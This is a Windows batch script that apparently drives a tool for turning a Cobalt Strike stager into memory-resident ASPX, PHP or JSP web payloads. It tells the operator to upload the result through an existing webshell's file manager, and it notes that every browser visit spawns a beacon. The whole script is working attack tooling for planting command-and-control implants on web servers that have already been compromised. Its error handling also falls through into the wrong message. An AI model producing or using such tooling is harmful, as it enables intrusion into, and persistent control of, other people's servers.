@echo off
setlocal enabledelayedexpansion
cd /d "%~dp0"

echo ============================================
echo   CS payload generator  (memory-resident)
echo ============================================
echo.
echo   Payload type:
echo     [1] ASPX  (.NET / IIS)      - needs nothing extra
echo     [2] PHP   (php-cgi/php-fpm) - needs FFI enabled in php.ini
echo     [3] JSP   (Tomcat / Java)   - needs JNA on the classpath
echo.
set "KIND=%~1"
if "%KIND%"=="" set /p KIND=Choose 1-3 [default 1]: 
if "%KIND%"=="" set KIND=1

set "SRC=%~2"
if "%SRC%"=="" set /p SRC=Path to aaa.c (CS stager .c file): 
if not exist "%SRC%" goto badsrc

set "EXT=--aspx"
if "%KIND%"=="2" set EXT=--php
if "%KIND%"=="3" set EXT=--jsp

set ARGS=%EXT% --shellcode "%SRC%"

echo.
echo [*] running: python make_beacon.py %ARGS%
echo.
python "%~dp0make_beacon.py" %ARGS%
if errorlevel 1 goto failed

echo.
echo [i] Upload the file with your webshell FILE MANAGER (do not use its console), then open it in a browser.
echo [i] A beacon is spawned on EVERY visit - delete the file when you are done.
goto done

:failed
echo.
echo [!] Generation failed. Check:
echo     1) python installed?   (python --version)
echo     2) is the aaa.c path correct?

:badsrc
echo.
echo [!] File not found: "%SRC%"
echo     Give the full path to the aaa.c exported from Cobalt Strike.
echo     If the path has spaces, wrap it in double quotes.

:done
echo.
if "%NOPAUSE%"=="" pause
endlocal
